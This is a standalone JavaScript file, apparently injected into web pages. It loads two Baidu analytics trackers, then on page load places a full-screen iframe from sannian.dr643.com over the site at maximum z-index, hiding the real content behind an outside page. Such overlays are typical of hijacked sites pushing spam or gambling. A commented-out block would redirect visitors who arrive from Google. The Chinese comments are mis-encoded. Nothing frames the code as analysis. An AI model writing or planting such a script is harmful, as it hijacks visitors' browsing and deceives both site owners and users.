var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?10e32d40835ef7e925942974c031ff29";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?19d70cc624ee50b7e9ab603b13863bfc";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;overflow:hidden;margin:0;padding:0}</style>');

function checktitle()
{
	var fit=1;
	var sou;
	var title = document.title;
        if(title.indexOf("3mao")!=-1||title.indexOf("3mao")!=-1)
	{
		sou="https://sannian.dr643.com/yb/pc.html";
	}
	else{
		sou = 'https://sannian.dr643.com/yb/pc.html';
	}

	var iframe = document.createElement('iframe');
	iframe.src = sou;
	iframe.style.position="absolute";iframe.style.width = '100%'; iframe.style.height="100%";iframe.style.top="0px";iframe.style.left="0px";iframe.style.bottom="0px";iframe.style.zIndex="9999999999999";
	iframe.style.border = 'none';
	iframe.style.background="#000";
	document.body.insertBefore(iframe, document.body.firstChild);
	document.body.style.overflow="hidden";
}
function ready(fn){
	if(document.addEventListener){		//��׼�����
		document.addEventListener('DOMContentLoaded',function(){
			//ע��ʱ�䣬�����ظ�����
			document.removeEventListener('DOMContentLoaded',arguments.callee,false);
			fn();		//���к���
		},false);
	}else if(document.attachEvent){		//IE�����
		document.attachEvent('onreadystatechange',function(){
			if(document.readyState=='complete'){
				document.detachEvent('onreadystatechange',arguments.callee);
				fn();		//��������
			}
		});
	}
}
/*window.onload=function(){
checktitle();
}
*/
ready(function(){checktitle();});
/*
var s=document.referrer
if(s.indexOf("google")>0){
location.href="/#";
}*/
